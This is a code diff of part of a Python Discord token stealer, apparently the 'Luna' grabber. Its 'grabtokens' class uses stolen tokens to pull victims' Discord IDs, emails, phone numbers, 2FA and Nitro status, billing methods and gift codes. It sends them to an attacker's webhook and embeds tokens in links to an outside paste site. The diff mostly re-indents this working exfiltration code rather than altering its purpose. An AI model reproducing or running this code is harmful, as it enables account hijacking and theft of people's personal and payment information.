@@ -221,7 +221,7 @@ class grabtokens():
                                     self.tokens.append(token)
                                     self.ids.append(uid)
 
-        def upload(self, webhook):
+    def upload(self, webhook):
         webhook = SyncWebhook.from_url(webhook, session=requests.Session())
         for token in self.tokens:
             if token in self.tokens_sent:
@@ -240,7 +240,6 @@ class grabtokens():
                 avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.png"
                 phone = r['phone']
                 email = r['email']
-
 
                 embed = Embed(title=username, color=5639644)
 
@@ -277,29 +276,28 @@ class grabtokens():
                     except TypeError: 
                         methods += "❓"
 
-                val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
+                    val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
 
-                g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes",headers=headers)
+                    g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes",headers=headers)
 
-                val_codes = []
-                if "code" in g.text:
-                    codes = json.loads(g.text)
-                    try:
-                        for code in codes:
-                            val_codes.append((code['code'], code['promotion']['outbound_title']))
-                    except TypeError:
-                        pass
+                    val_codes = []
+                    if "code" in g.text:
+                        codes = json.loads(g.text)
+                        try:
+                            for code in codes:
+                                val_codes.append((code['code'], code['promotion']['outbound_title']))
+                        except TypeError:
+                            pass
 
-                if val_codes == []:
-                    val += f'\n:gift: **No Gift Cards Found**\n'
-                else:
-                    for c, t in val_codes:
-                        val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
+                    if val_codes == []:
+                        val += f'\n:gift: **No Gift Cards Found**\n'
+                    else:
+                        for c, t in val_codes:
+                            val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
 
-                embed.add_field(name="Discord Info", value=val + "\u200b", inline=False)
-                embed.set_thumbnail(url=avatar)
-
-                webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+                    embed.add_field(name="Discord Info", value=val + "\u200b", inline=False)
+                    embed.set_thumbnail(url=avatar)
+                    webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
 @try_extract
 class browsers():
